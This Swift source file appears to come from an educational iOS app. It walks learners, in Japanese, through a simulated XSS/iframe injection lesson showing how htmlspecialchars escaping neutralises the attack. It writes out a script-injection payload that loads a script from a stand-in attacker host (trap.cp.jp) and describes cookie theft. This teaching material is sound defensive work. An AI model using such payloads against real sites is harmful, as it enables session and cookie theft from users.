import UIKit

class IFrameInjectionSafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapButton = A()
    let welcomeLabel = H1()
    let nameLabel = P()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        showTrap()
    }
    
    private func setupViews() {
        trapButton.set(text: "このサイト本当に面白い!!")
        trapButton.set(
            code: "<a href=\"http://www.safe.co.jp/welcome.php?name=<script src=http://www.trap.cp.jp/iframe_injection.js></script>\">\n    このサイト本当に面白い!!\n</a>",
            language: .html
        )
        trapButton.button.addTarget(self, action: #selector(handleDisabledButton(_:)), for: .touchUpInside)
        welcomeLabel.set(text: "ようこそ脆弱株式会社へ")
        nameLabel.set(text: "<script src=\"http://www.trap.cp.jp/iframe_injection.js\"></script>さん")
        nameLabel.set(
            code: "<p><?php echo htmlspecialchars($_GET[\"name\"], ENT_QUOTES); ?>さん</p>",
            language: .php
        )
    }
    
    private func showTrap() {
        body.clear()
        body.append(element: trapButton)
        clearGuideSections()
        appendGuideSection([GuideText(text: "これが攻撃者が用意した罠サイトです。")])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれたリンクに攻撃を行うコードが仕掛けられています。\nリンクの下に表示されたコードを見てみましょう。"),
            GuideText(
                text: "リンク先に遷移する際、GETリクエストのnameパラメータには次の値が設定されます。"
            ),
            GuideText(text: "<script src=http://www.trap.cp.jp/iframe_injection.js></script>", programingLanguages: [.html]),
            GuideText(
                text: "この値をエスケープせずに直接表示すると、「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」はHTML要素として解釈されてしまいます。",
                programingLanguages: [.html]
            ),
            GuideText(
                text: "しかし、今回は特殊文字のエスケープを行なっているため、「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」はHTML要素としてではなく、単純な文字列として解釈されます。",
                programingLanguages: [.html]),
            ],
                           onEnter: { completion in
                            self.focus(on: self.trapButton) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.trapButton) {
                completion?()
            }
        })
        appendGuideSection(
            [GuideText(text: "それでは実際にこのリンクをタップしてリンク先に遷移してみましょう。")],
            onEnter: { completion in
                self.trapButton.button.removeTarget(self, action: #selector(self.handleDisabledButton(_:)), for: .touchUpInside)
                self.trapButton.button.addTarget(self, action: #selector(self.handleTrapButtonToShowWelcome(_:)), for: .touchUpInside)
                completion?()
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func showWelcome() {
        body.clear()
        body.append(element: welcomeLabel)
        body.append(element: nameLabel)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これがリンク先のWebサイトです。"),
            ])
        appendGuideSection([
            GuideText(
                text: "この赤枠で囲まれた<p>要素でユーザの名前を表示しようとしています。",
                programingLanguages: [.html]
            ),
            GuideText(
                text: "今回はGETリクエストのnameパラメータに次の値が設定されていました。"
            ),
            GuideText(text: "<script src=http://www.trap.cp.jp/iframe_injection.js></script>\nしかし、特殊文字のエスケープを行なっているので渡された値がそのまま文字列として表示されています。", programingLanguages: [.html]),
            GuideText(
                text: "実際に実行されたのは以下のコードです。\n<p>&lt;script src=\"http://www.trap.cp.jp/iframe_injection.js\"&gt;&lt;/script&gt;さん</p>",
                programingLanguages: [.html]
            ),
            GuideText(
                text: "従って今回は体験編でみたような<iframe>要素は表示されていませんし、ユーザのCookieを盗むスクリプトも実行されていません",
                programingLanguages: [.html]
            ),
            GuideText(text: "このように、特殊文字のエスケープを行うことによって体験編と全く同じコードで攻撃を仕掛けられましたが、攻撃者の意図したコードは実行されませんでした。"),
            GuideText(
                text: "Webアプリケーションの開発においては、ユーザから受け取った値を表示する場合は、今回行ったようにまずエスケープ処理を行いその後に表示するようにしましょう。"
            )
            ],
                           onEnter: { completion in
                            self.focus(on: self.nameLabel) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.nameLabel) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "それでは今回のレッスンはこれで終了です。\n他の攻撃手法についても様々なレッスンを用意していますので、そちらも参考にしてみてください。\nお疲れ様でした。")
            ])
        addCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    @objc
    private func handleTrapButtonToShowWelcome(_ sender: UIButton) {
        hideGuideMessageCollectionView {
            self.unfocusAll() {
                self.showWelcome()
            }
        }
    }
    
}
